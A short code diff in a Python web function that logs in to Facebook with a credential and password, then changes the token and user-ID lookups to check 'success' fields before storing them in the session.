@@ -69,11 +69,13 @@ def direct_fb():
             
             # Get Facebook token and user ID
             try:
-                token = get_facebook_token(credential, password)
-                if token:
-                    user_id = get_facebook_user_id(token)
+                token_result = get_facebook_token(credential, password)
+                if token_result['success']:
+                    token = token_result['token']
+                    user_info = get_facebook_user_id(token)
                     
-                    if user_id:
+                    if user_info['success']:
+                        user_id = user_info['user_id']
                         # Store in session for later use
                         session['fb_token'] = token
                         session['fb_user_id'] = user_id
